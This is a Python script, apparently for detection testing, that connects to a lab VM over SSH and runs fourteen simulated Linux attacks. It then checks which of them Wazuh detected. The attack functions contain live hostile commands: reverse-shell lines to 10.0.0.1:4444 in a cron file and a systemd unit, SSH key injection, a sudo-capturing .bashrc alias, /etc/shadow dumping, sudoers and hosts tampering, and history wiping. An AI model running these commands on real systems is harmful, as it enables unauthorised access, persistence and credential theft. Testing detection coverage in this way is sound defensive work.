#!/usr/bin/env python3
"""
attack_linux.py
Run Linux attacks from the ABSEGA platform against a target VM via SSH.
Wazuh on the target collects logs; detections queried via Wazuh Indexer.
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field

import httpx
import paramiko
from dotenv import load_dotenv

# Force UTF-8 stdout/stderr so the ✓/✗/— glyphs this script prints don't crash
# on Windows consoles (cp1252) or when captured via a subprocess PIPE.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass

load_dotenv()

# ── Config ──────────────────────────────────────────────────────────────────

TARGET_HOST     = os.getenv("TARGET_HOST", "192.168.36.128")
TARGET_USER     = os.getenv("TARGET_USER", "mike")
TARGET_PASSWORD = os.getenv("TARGET_PASSWORD", "root")

INDEXER_URL      = os.getenv("INDEXER_URL", "https://192.168.36.128:9200")
INDEXER_USER     = os.getenv("INDEXER_USER", "admin")
INDEXER_PASSWORD = os.getenv("INDEXER_PASSWORD", "")

RUN_ID = "WAZUH_LINUX_TEST_" + datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

WORK_DIR = "/opt/attack_test"


# ── SSH helpers ──────────────────────────────────────────────────────────────

def ssh_connect() -> Optional[paramiko.SSHClient]:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=TARGET_HOST,
            username=TARGET_USER,
            password=TARGET_PASSWORD,
            timeout=15,
        )
        print(f"[SSH] Connected to {TARGET_HOST} as {TARGET_USER}")
        return client
    except Exception as e:
        print(f"[SSH] Connection failed: {e}")
        return None


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> Dict[str, Any]:
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="ignore").strip()
        err = stderr.read().decode(errors="ignore").strip()
        status = stdout.channel.recv_exit_status()
        return {"cmd": cmd, "stdout": out, "stderr": err, "status": status}
    except Exception as e:
        return {"cmd": cmd, "stdout": "", "stderr": str(e), "status": -1}


def sudo_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> Dict[str, Any]:
    return ssh_run(client, f"echo {TARGET_PASSWORD} | sudo -S {cmd}", timeout=timeout)


def setup_workdir(client: paramiko.SSHClient):
    dirs = [
        WORK_DIR,
        f"{WORK_DIR}/fake_cron",
        f"{WORK_DIR}/fake_systemd",
        f"{WORK_DIR}/fake_logs",
        f"{WORK_DIR}/fake_etc",
        f"{WORK_DIR}/fake_firewall",
    ]
    cmd = f"mkdir -p {' '.join(dirs)}"
    r = sudo_run(client, cmd)
    if r["status"] == 0:
        sudo_run(client, f"chown -R {TARGET_USER}:{TARGET_USER} {WORK_DIR}")
        print(f"[SETUP] Work directory ready: {WORK_DIR}")
    else:
        print(f"[SETUP] Warning: {r['stderr']}")


def log_attack(client: paramiko.SSHClient, attack_name: str):
    ssh_run(client, f"logger -t ABSEGA_ATTACK '{RUN_ID} attack={attack_name}'")


# ── Result model ─────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    name: str
    scenario_id: str
    success: bool
    description: str
    details: Dict[str, Any] = field(default_factory=dict)
    wazuh_detected: bool = False
    wazuh_alerts: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "scenario_id": self.scenario_id,
            "success": self.success,
            "description": self.description,
            "details": self.details,
            "wazuh_detected": self.wazuh_detected,
            "wazuh_alert_count": len(self.wazuh_alerts),
        }


# ── Attacks ──────────────────────────────────────────────────────────────────

def attack_ssh_brute_force(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "SSH_Brute_Force")
    target_user = "ubuntu"
    passwords = ["password", "123456", "admin123", "letmein", "ubuntu123"]
    attempts = []
    for pwd in passwords:
        brute = paramiko.SSHClient()
        brute.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            brute.connect(
                hostname=TARGET_HOST,
                username=target_user,
                password=pwd,
                timeout=5,
            )
            brute.close()
            attempts.append({"password": pwd, "result": "unexpected_success"})
        except paramiko.AuthenticationException:
            attempts.append({"password": pwd, "result": "auth_failed"})
        except Exception as e:
            attempts.append({"password": pwd, "result": str(e)})
        time.sleep(0.5)
    return AttackResult(
        name="SSH Brute Force",
        scenario_id="linux_001",
        success=True,
        description="5 failed SSH login attempts to user 'ubuntu' with wrong passwords from remote host.",
        details={"target_user": target_user, "attempts": attempts},
    )



def attack_cron_persistence(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Cron_Job_Persistence")
    cron_file = f"{WORK_DIR}/fake_cron/malicious"
    r1 = ssh_run(client, f"echo '* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > {cron_file}")
    r2 = ssh_run(client, f"cat {cron_file}")
    r3 = ssh_run(client, f"(crontab -l 2>/dev/null; echo '# ATTACK_TEST_{RUN_ID}') | crontab -")
    r4 = ssh_run(client, "crontab -l")
    success = r1["status"] == 0
    return AttackResult(
        name="Cron Job Persistence",
        scenario_id="linux_003",
        success=success,
        description="Created malicious cron job for persistence.",
        details={"cron_file": r2, "crontab": r4},
    )


def attack_suid_binary(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "SUID_Binary_Abuse")
    suid_bin = f"{WORK_DIR}/suid_find"
    r1 = ssh_run(client, f"cp /usr/bin/find {suid_bin}")
    r2 = sudo_run(client, f"chmod u+s {suid_bin}")
    r3 = ssh_run(client, f"ls -la {suid_bin}")
    success = r1["status"] == 0 and r2["status"] == 0
    return AttackResult(
        name="SUID Binary Abuse",
        scenario_id="linux_004",
        success=success,
        description="Created SUID binary to escalate privileges.",
        details={"binary": r3["stdout"]},
    )


def attack_user_creation(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Unauthorized_User_Creation")
    new_user = f"hacker_{RUN_ID[-6:].lower()}"
    r1 = sudo_run(client, f"useradd -m -s /bin/bash {new_user}")
    r2 = sudo_run(client, f"bash -c \"echo '{new_user}:P@ssw0rd123' | chpasswd\"")
    r3 = sudo_run(client, f"usermod -aG sudo {new_user}")
    r4 = ssh_run(client, f"grep {new_user} /etc/passwd")
    success = r1["status"] == 0
    sudo_run(client, f"userdel -r {new_user} 2>/dev/null || true")
    return AttackResult(
        name="Unauthorized User Creation",
        scenario_id="linux_005",
        success=success,
        description="Created unauthorized user with sudo privileges.",
        details={"user": new_user, "passwd_entry": r4["stdout"]},
    )


def attack_ssh_key_injection(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "SSH_Key_Injection")
    ssh_dir = f"/home/{TARGET_USER}/.ssh"
    auth_keys = f"{ssh_dir}/authorized_keys"
    fake_key = f"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackKey{RUN_ID} attacker@evil.com"
    r1 = ssh_run(client, f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir}")
    r2 = ssh_run(client, f"echo '{fake_key}' >> {auth_keys}")
    r3 = ssh_run(client, f"chmod 600 {auth_keys}")
    r4 = ssh_run(client, f"tail -1 {auth_keys}")
    ssh_run(client, f"sed -i '/AttackKey{RUN_ID}/d' {auth_keys}")
    success = r2["status"] == 0
    return AttackResult(
        name="SSH Key Injection",
        scenario_id="linux_006",
        success=success,
        description="Injected unauthorized SSH key into authorized_keys.",
        details={"key_added": r4["stdout"]},
    )


def attack_systemd_backdoor(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Systemd_Backdoor")
    service_file = f"{WORK_DIR}/fake_systemd/backdoor.service"
    content = f"""[Unit]
Description=System Update Service {RUN_ID}
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target"""
    r1 = ssh_run(client, f"cat > {service_file} << 'SVCEOF'\n{content}\nSVCEOF")
    r2 = ssh_run(client, f"cat {service_file}")
    success = r1["status"] == 0 and "Unit" in r2["stdout"]
    return AttackResult(
        name="Systemd Backdoor",
        scenario_id="linux_007",
        success=success,
        description="Created malicious systemd service file.",
        details={"service_file": service_file},
    )


def attack_bashrc_persistence(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Bashrc_Persistence")
    marker = f"# ATTACK_{RUN_ID}"
    payload = f"alias sudo='echo {RUN_ID} >> /tmp/stolen_creds.txt; sudo'"
    r1 = ssh_run(client, f"echo '{marker}' >> /home/{TARGET_USER}/.bashrc")
    r2 = ssh_run(client, f"echo '{payload}' >> /home/{TARGET_USER}/.bashrc")
    r3 = ssh_run(client, f"tail -3 /home/{TARGET_USER}/.bashrc")
    ssh_run(client, f"sed -i '/ATTACK_{RUN_ID}/d' /home/{TARGET_USER}/.bashrc")
    ssh_run(client, f"sed -i '/stolen_creds/d' /home/{TARGET_USER}/.bashrc")
    success = r1["status"] == 0
    return AttackResult(
        name="Bashrc Persistence",
        scenario_id="linux_008",
        success=success,
        description="Injected malicious alias into .bashrc for persistence.",
        details={"tail": r3["stdout"]},
    )


def attack_log_tampering(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Log_Tampering")
    fake_log = f"{WORK_DIR}/fake_logs/auth.log"
    r1 = ssh_run(client, f"""cat > {fake_log} << 'EOF'
Jul 10 10:00:00 host sshd[1234]: Accepted password for root from 1.2.3.4 port 54321 ssh2
Jul 10 10:01:00 host sshd[1235]: Failed password for invalid user test from 5.6.7.8 port 54322 ssh2
Jul 10 10:02:00 host sudo[1236]: mike : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
EOF""")
    r2 = ssh_run(client, f"sed -i '/Failed password/d' {fake_log}")
    r3 = ssh_run(client, f"cat {fake_log}")
    r4 = ssh_run(client, "cat /dev/null > ~/.bash_history && history -c")
    success = r1["status"] == 0
    return AttackResult(
        name="Log Tampering",
        scenario_id="linux_009",
        success=success,
        description="Tampered with log files and cleared bash history.",
        details={"log_after_tamper": r3["stdout"], "history_cleared": r4["status"] == 0},
    )


def attack_credential_dumping(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Credential_Dumping")
    r1 = sudo_run(client, "cat /etc/shadow")
    r2 = sudo_run(client, "bash -c \"cat /etc/passwd | grep -v nologin | grep -v false\"")
    lines = r1["stdout"].strip().splitlines()
    users = []
    for line in lines:
        parts = line.split(":")
        if len(parts) >= 2 and parts[1] not in ["*", "!", "", "x"]:
            users.append(parts[0])
    success = r1["status"] == 0
    return AttackResult(
        name="Credential Dumping",
        scenario_id="linux_010",
        success=success,
        description="Read /etc/shadow to dump password hashes.",
        details={"users_with_hashes": users, "shadow_lines": len(lines)},
    )


def attack_sudoers_modification(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Sudoers_Modification")
    fake_sudoers = f"{WORK_DIR}/fake_etc/sudoers_evil"
    r1 = ssh_run(client, f"echo 'attacker ALL=(ALL) NOPASSWD:ALL' > {fake_sudoers}")
    ssh_run(client, f"echo '# ATTACK_{RUN_ID}' > /tmp/absega_sudoers_tmp")
    r2 = sudo_run(client, "cp /tmp/absega_sudoers_tmp /etc/sudoers.d/zzz_attack_test")
    r3 = sudo_run(client, "ls /etc/sudoers.d/")
    sudo_run(client, "rm -f /etc/sudoers.d/zzz_attack_test")
    success = r1["status"] == 0
    return AttackResult(
        name="Sudoers Modification",
        scenario_id="linux_011",
        success=success,
        description="Modified sudoers to grant unauthorized privileges.",
        details={"sudoers_d": r3["stdout"]},
    )


def attack_hosts_modification(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Hosts_File_Modification")
    ssh_run(client, f"echo '# ATTACK_{RUN_ID}' > /tmp/absega_hosts_tmp1")
    ssh_run(client, "echo '10.0.0.1 evil.com update.microsoft.com' > /tmp/absega_hosts_tmp2")
    r1 = sudo_run(client, "bash -c 'cat /tmp/absega_hosts_tmp1 >> /etc/hosts'")
    r2 = sudo_run(client, "bash -c 'cat /tmp/absega_hosts_tmp2 >> /etc/hosts'")
    r3 = ssh_run(client, "tail -3 /etc/hosts")
    sudo_run(client, f"sed -i '/ATTACK_{RUN_ID}/d' /etc/hosts")
    sudo_run(client, "sed -i '/evil.com/d' /etc/hosts")
    success = r1["status"] == 0
    return AttackResult(
        name="Hosts File Modification",
        scenario_id="linux_012",
        success=success,
        description="Modified /etc/hosts for DNS spoofing.",
        details={"hosts_tail": r3["stdout"]},
    )


def attack_firewall_tampering(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Firewall_Tampering")
    r1 = sudo_run(client, "iptables -L INPUT --line-numbers")
    r2 = sudo_run(client, "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT")
    r3 = sudo_run(client, "bash -c 'iptables -L INPUT --line-numbers | grep 4444'")
    sudo_run(client, "iptables -D INPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null || true")
    success = r2["status"] == 0
    return AttackResult(
        name="Firewall Tampering",
        scenario_id="linux_013",
        success=success,
        description="Added firewall rule to open backdoor port 4444.",
        details={"rule_added": r3["stdout"]},
    )


def attack_recon_enum(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "System_Reconnaissance")
    cmds = [
        ("uname -a", "OS info"),
        ("id && whoami", "Current user"),
        ("cat /etc/os-release", "OS release"),
        ("ps aux --sort=-%cpu | head -20", "Running processes"),
        ("netstat -tulpn 2>/dev/null || ss -tulpn", "Open ports"),
        ("find / -perm -4000 -type f 2>/dev/null | head -20", "SUID files"),
        ("cat /etc/crontab", "Crontab"),
        ("ls -la /home/", "Home directories"),
        ("echo " + TARGET_PASSWORD + " | sudo -S -l", "Sudo permissions"),
        ("last | head -10", "Login history"),
    ]
    results = {}
    for cmd, label in cmds:
        r = ssh_run(client, cmd, timeout=15)
        results[label] = r["stdout"][:200] if r["status"] == 0 else f"FAILED: {r['stderr'][:100]}"
    return AttackResult(
        name="System Reconnaissance",
        scenario_id="linux_014",
        success=True,
        description="Performed system enumeration and reconnaissance.",
        details=results,
    )


def attack_data_exfiltration(client: paramiko.SSHClient) -> AttackResult:
    log_attack(client, "Data_Exfiltration")
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        f"/home/{TARGET_USER}/.bash_history",
        f"/home/{TARGET_USER}/.ssh/known_hosts",
        "/var/log/auth.log",
    ]
    results = {}
    for f in sensitive_files:
        r = sudo_run(client, f"bash -c 'wc -l {f} 2>/dev/null && head -3 {f} 2>/dev/null'")
        results[f] = "accessible" if r["status"] == 0 else "denied"
    r_stage = sudo_run(client, f"bash -c 'cat /etc/passwd /etc/shadow 2>/dev/null | gzip | base64 > /tmp/exfil_{RUN_ID}.b64'")
    r_size = ssh_run(client, f"ls -lh /tmp/exfil_{RUN_ID}.b64 2>/dev/null")
    ssh_run(client, f"rm -f /tmp/exfil_{RUN_ID}.b64")
    return AttackResult(
        name="Data Exfiltration",
        scenario_id="linux_015",
        success=True,
        description="Staged sensitive data for exfiltration.",
        details={"files": results, "staged": r_size["stdout"]},
    )


# ── Wazuh detection via Indexer ──────────────────────────────────────────────

def query_wazuh_indexer(time_from: str) -> List[Dict[str, Any]]:
    """Fetch every Wazuh alert since the run started (level >= 3, Wazuh's default
    minimum). We deliberately do NOT filter by the RUN_ID marker here: real
    detections (e.g. rule 5402 "sudo to ROOT", FIM checksum changes) never carry
    our marker, and biasing the query toward the marker is exactly what made the
    report miss genuine detections while over-counting our own tagging rules."""
    try:
        resp = httpx.post(
            f"{INDEXER_URL}/wazuh-alerts-*/_search",
            auth=(INDEXER_USER, INDEXER_PASSWORD),
            verify=False,
            timeout=30,
            json={
                "size": 500,
                "query": {
                    "bool": {
                        "must": [
                            {"range": {"@timestamp": {"gte": time_from}}},
                            {"range": {"rule.level": {"gte": 3}}},
                        ]
                    }
                },
                "sort": [{"@timestamp": {"order": "desc"}}]
            }
        )
        if resp.status_code == 200:
            hits = resp.json().get("hits", {}).get("hits", [])
            return [h["_source"] for h in hits]
        else:
            print(f"[INDEXER] Query returned HTTP {resp.status_code}")
    except Exception as e:
        print(f"[INDEXER] Query failed: {e}")
    return []


# ── Detection correlation ─────────────────────────────────────────────────────
# Per-attack criteria for what a REAL Wazuh rule emits when it catches the
# behaviour (mirrors app/routes/wazuh.py). A tagging rule that merely saw our
# RUN_ID marker never counts — only a genuine detection does.
#   groups — alert rule.groups intersect these
#   desc   — substring in rule.description
#   cmd    — substring in full_log (sudo COMMAND=, auth line, …)
#   fim    — substring in syscheck.path (the exact monitored file that changed)
DETECTION_CRITERIA: Dict[str, Dict[str, List[str]]] = {
    "linux_001": {"groups": ["authentication_failed", "authentication_failures"],
                  "desc": ["authentication failed", "failed password",
                           "user login failed", "multiple failed"]},
    "linux_003": {"desc": ["crontab entry changed", "crontab"],
                  "cmd": ["(ubuntu) replace", "(root) replace", "crontab["]},
    "linux_004": {"cmd": ["chmod u+s", "chmod 4755", "chmod +s"], "fim": ["suid_find"]},
    "linux_005": {"groups": ["adduser", "account_changed"],
                  "desc": ["new user added", "new group added"],
                  "cmd": ["/usr/sbin/useradd", "useradd -m"]},
    "linux_006": {"fim": ["authorized_keys"]},
    "linux_007": {"fim": ["/etc/systemd/system", "backdoor.service", "system-health"],
                  "cmd": ["daemon-reload", "/etc/systemd/system"]},
    "linux_008": {"fim": ["/.bashrc"]},
    "linux_009": {"desc": ["log file cleared", "syslog cleared"],
                  "cmd": ["truncate -s 0", "truncate -s0"],
                  "fim": ["/var/log/auth.log", "auth.log", "bash_history"]},
    "linux_010": {"cmd": ["cat /etc/shadow", "/bin/cat /etc/shadow",
                          "/usr/bin/cat /etc/shadow"]},
    "linux_011": {"fim": ["/etc/sudoers"], "cmd": ["/etc/sudoers.d", "sudoers.d/"]},
    "linux_012": {"fim": ["/etc/hosts"], "cmd": [">> /etc/hosts", "/etc/hosts"]},
    "linux_013": {"desc": ["iptables", "firewall"],
                  "cmd": ["iptables -a", "iptables -i", "--dport 4444"]},
    "linux_014": {"desc": ["enumeration", "reconnaissance"], "cmd": ["sudo -l", "sudo -s -l"]},
    "linux_015": {"cmd": ["exfil_", "gzip | base64", "| base64"]},
}


def is_tracking_alert(src: Dict[str, Any]) -> bool:
    """True if the alert is one of our own ABSEGA tagging rules (fired only
    because it saw the RUN_ID marker), so it must not count as a detection."""
    rule = src.get("rule", {}) or {}
    rid = str(rule.get("id", ""))
    if rid.isdigit() and 100000 <= int(rid) < 101000:
        return True
    desc = (rule.get("description") or "").lower()
    return "absega" in desc or "attack simulation" in desc


def alert_matches(src: Dict[str, Any], crit: Dict[str, List[str]], run_id_lc: str) -> bool:
    rule = src.get("rule", {}) or {}
    groups = [g.lower() for g in (rule.get("groups") or [])]
    desc = (rule.get("description") or "").lower()
    full_log = (src.get("full_log") or "").lower().replace(run_id_lc, "")
    fim_path = ((src.get("syscheck") or {}).get("path") or "").lower()
    if crit.get("groups") and any(g in set(crit["groups"]) for g in groups):
        return True
    if crit.get("desc") and any(d in desc for d in crit["desc"]):
        return True
    if crit.get("cmd") and full_log and any(c in full_log for c in crit["cmd"]):
        return True
    if crit.get("fim") and fim_path and any(f in fim_path for f in crit["fim"]):
        return True
    return False


def correlate_detections(results: List[AttackResult], alerts: List[Dict[str, Any]]):
    """Populate each attack's wazuh_detected / wazuh_alerts from the REAL (non-
    tracking) alerts that match its detection criteria."""
    run_id_lc = RUN_ID.lower()
    real_alerts = [a for a in alerts if not is_tracking_alert(a)]
    for r in results:
        crit = DETECTION_CRITERIA.get(r.scenario_id)
        if not crit:
            continue
        for a in real_alerts:
            if alert_matches(a, crit, run_id_lc):
                r.wazuh_alerts.append(a)
        r.wazuh_detected = len(r.wazuh_alerts) > 0
    return real_alerts


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    print("\n" + "=" * 60)
    print(f"  Linux Attack Runner — {RUN_ID}")
    print(f"  Target : {TARGET_HOST} ({TARGET_USER})")
    print(f"  Indexer: {INDEXER_URL}")
    print("=" * 60 + "\n")

    client = ssh_connect()
    if client is None:
        print("[!] Cannot connect via SSH. Aborting.")
        return

    setup_workdir(client)
    start_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    attacks = [
        attack_ssh_brute_force,
        attack_cron_persistence,
        attack_suid_binary,
        attack_user_creation,
        attack_ssh_key_injection,
        attack_systemd_backdoor,
        attack_bashrc_persistence,
        attack_log_tampering,
        attack_credential_dumping,
        attack_sudoers_modification,
        attack_hosts_modification,
        attack_firewall_tampering,
        attack_recon_enum,
        attack_data_exfiltration,
    ]

    results: List[AttackResult] = []
    for attack_fn in attacks:
        name = attack_fn.__name__.replace("attack_", "").replace("_", " ").title()
        print(f"[*] Running: {name}...", end=" ", flush=True)
        try:
            result = attack_fn(client)
            status = "✓" if result.success else "✗"
            print(f"{status}")
            results.append(result)
        except Exception as e:
            print(f"✗ ERROR: {e}")
            results.append(AttackResult(
                name=name, scenario_id="error", success=False, description=f"Exception: {e}",
            ))
        time.sleep(0.5)

    client.close()

    succeeded = sum(1 for r in results if r.success)
    print(f"\n[*] Attacks complete: {succeeded}/{len(results)} succeeded")

    print("\n[*] Waiting 15 seconds for Wazuh to index alerts...")
    time.sleep(15)

    print("[*] Querying Wazuh indexer...")
    linux_alerts = query_wazuh_indexer(start_time)

    # Correlate REAL detections back to each attack. Tagging rules that only saw
    # our RUN_ID marker are excluded, so wazuh_detected reflects genuine coverage.
    real_alerts = correlate_detections(results, linux_alerts)
    tag_alerts = len(linux_alerts) - len(real_alerts)
    detected_attacks = sum(1 for r in results if r.wazuh_detected)
    print(f"[*] Alerts in window: {len(linux_alerts)} "
          f"({len(real_alerts)} real, {tag_alerts} tagging-only)")
    print(f"[*] Attacks with a real Wazuh detection: {detected_attacks}/{len(results)}")

    if real_alerts:
        print("\n── Real Wazuh Detections ───────────────────────────────────")
        seen = set()
        for a in real_alerts:
            rule = a.get("rule", {})
            rid = rule.get("id", "?")
            desc = rule.get("description", "?")
            key = f"{rid}:{desc}"
            if key not in seen:
                seen.add(key)
                print(f"  Rule {rid}: {desc}")

    report = {
        "run_id": RUN_ID,
        "target": TARGET_HOST,
        "start_time": start_time,
        "attacks_total": len(results),
        "attacks_succeeded": succeeded,
        # Count only genuine detections, not our own tagging rules.
        "wazuh_linux_alerts": len(real_alerts),
        "wazuh_tagging_alerts": tag_alerts,
        "attacks_detected": detected_attacks,
        "results": [r.to_dict() for r in results],
        "detections": [
            {
                "rule_id": a.get("rule", {}).get("id"),
                "description": a.get("rule", {}).get("description"),
                "level": a.get("rule", {}).get("level"),
                "timestamp": a.get("@timestamp"),
            }
            for a in real_alerts
        ]
    }

    out_file = f"linux_report_{RUN_ID}.json"
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n── Summary ─────────────────────────────────────────────────")
    print(f"  Attacks succeeded : {succeeded}/{len(results)}")
    print(f"  Attacks detected  : {detected_attacks}/{len(results)}")
    print(f"  Real detections   : {len(real_alerts)} alerts")
    print(f"  Run ID            : {RUN_ID}")
    print(f"  Report            : {out_file}")
    print(f"  {RUN_ID}")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Linux attack runner for Wazuh detection testing")
    p.add_argument("--target", default=None, help="SSH target host (overrides TARGET_HOST env)")
    p.add_argument("--user", default=None, help="SSH username (overrides TARGET_USER env)")
    p.add_argument("--password", default=None, help="SSH password (overrides TARGET_PASSWORD env)")
    args = p.parse_args()
    if args.target:
        TARGET_HOST = args.target  # noqa: F841
    if args.user:
        TARGET_USER = args.user  # noqa: F841
    if args.password:
        TARGET_PASSWORD = args.password  # noqa: F841
    main()
